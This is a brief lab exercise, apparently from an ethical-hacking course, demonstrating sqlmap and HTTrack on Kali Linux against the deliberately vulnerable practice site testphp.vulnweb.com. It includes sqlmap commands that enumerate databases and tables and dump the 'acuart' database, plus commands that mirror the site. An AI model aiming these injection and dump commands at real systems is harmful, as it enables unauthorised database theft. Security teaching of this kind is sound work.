Exp-3 
Aim: To demonstrate Hacking tools on Kali-Linux: SQL Map, HTTrack.
Objective: To demonstrate the use of SQLMap for detecting and exploiting SQL injection vulnerabilities and HTTrack for website mirroring on Kali Linux, highlighting their applications in ethical hacking and security assessments.

SQL MAPPING 

sqlmap -u "https://testphp.vulnweb.com/listproducts.php?cat=1" --dbs


sqlmap -u "https://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables


sqlmap -u "https://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --dump 


HTTRACK

sudo apt install httrack -y 

httrack --version

httrack https://testphp.vulnweb.com/ -O ~/httrack_site 

cd ~/httrack_site

cd ~/httrack_site/testphp.vulnweb.com

firefox index.html
